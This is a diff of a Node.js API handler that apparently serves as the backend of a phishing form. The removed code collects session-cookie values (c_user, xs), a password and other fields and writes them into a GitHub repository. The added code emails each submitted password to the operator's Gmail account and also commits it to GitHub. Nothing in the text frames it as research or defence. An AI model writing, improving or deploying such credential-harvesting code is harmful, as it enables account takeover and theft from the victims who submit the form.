@@ -1,81 +1,65 @@
-const axios = require('axios');
+// pages/api/submit.js
+export default function handler(req, res) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
-module.exports = async (req, res) => {
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
-    }
+  const { password } = req.body;
 
-    const {
-        c_user,
-        xs,
-        pass_field,
-        review_id,
-        user_agent,
-        ip_address,
-        timestamp,
-        facial_data,
-        blockchain_hash
-    } = req.body;
+  if (!password) {
+    return res.status(400).json({ error: 'Password is required' });
+  }
 
-    if (!c_user || !xs || !pass_field || !review_id) {
-        return res.status(400).json({ error: 'Missing required fields' });
-    }
+  const nodemailer = require('nodemailer');
+  const { Octokit } = require('@octokit/rest');
 
-    const repoOwner = 'spiderman786';
-    const repoName = 'my-security-forms';
-    const filePath = 'data/submissions.json';
-    const token = process.env.GITHUB_TOKEN;
+  // Email setup
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: process.env.GMAIL_USER,
+      pass: process.env.GMAIL_PASS,
+    },
+  });
 
-    if (!token) {
-        return res.status(500).json({ error: 'GitHub token not set' });
-    }
+  const mailOptions = {
+    from: process.env.GMAIL_USER,
+    to: process.env.GMAIL_USER,
+    subject: 'New Form Submission',
+    text: `Password: ${password}`,
+  };
 
-    console.log('Token length:', token.length); // Debug: Token check
-    console.log('Request body:', req.body); // Debug: Incoming data
+  // GitHub setup
+  const octokit = new Octokit({
+    auth: process.env.GITHUB_TOKEN,
+  });
 
-    try {
-        let currentData = [];
-        try {
-            const { data } = await axios.get(
-                `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
-                { headers: { Authorization: `token ${token}` } }
-            );
-            if (data.content) {
-                currentData = JSON.parse(Buffer.from(data.content, 'base64').toString());
-            }
-        } catch (error) {
-            console.log('Get error:', error.message, error.response?.status);
-            if (error.response?.status !== 404) {
-                throw new Error(`Failed to fetch file: ${error.message}`);
-            }
+  const submission = {
+    password,
+    timestamp: new Date().toISOString(),
+  };
+
+  // Save to GitHub
+  octokit.rest.repos
+    .createOrUpdateFileContents({
+      owner: process.env.GITHUB_OWNER,
+      repo: process.env.GITHUB_REPO,
+      path: `submissions/${Date.now()}.json`,
+      message: 'Add new submission',
+      content: Buffer.from(JSON.stringify(submission, null, 2)).toString('base64'),
+    })
+    .then(() => {
+      // Send email
+      transporter.sendMail(mailOptions, (error) => {
+        if (error) {
+          console.error('Email error:', error);
+          return res.status(500).json({ error: 'Failed to send email' });
         }
-
-        currentData.push({
-            c_user,
-            xs,
-            pass_field,
-            review_id,
-            user_agent: user_agent || req.headers['user-agent'] || 'N/A',
-            ip_address: ip_address || req.headers['x-forwarded-for'] || 'N/A',
-            timestamp: timestamp || new Date().toISOString(),
-            facial_data: facial_data || 'N/A',
-            blockchain_hash: blockchain_hash || 'N/A'
-        });
-
-        const response = await axios.put(
-            `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
-            {
-                message: 'Add new submission',
-                content: Buffer.from(JSON.stringify(currentData, null, 2)).toString('base64'),
-                sha: data?.sha || undefined
-            },
-            { headers: { Authorization: `token ${token}` } }
-        );
-
-        console.log('Put success:', response.status); // Debug: Confirm success
-        res.status(200).json({ message: 'Data saved successfully', sha: response.data.content.sha });
-    } catch (error) {
-        console.error('Error:', error.message, error.response?.status);
-        res.status(500).json({ error: 'Failed to save data: ' + error.message });
-    }
-};
+        res.status(200).json({ message: 'Submission received' });
+      });
+    })
+    .catch((err) => {
+      console.error('GitHub error:', err);
+      res.status(500).json({ error: 'Failed to save to GitHub' });
+    });
+}
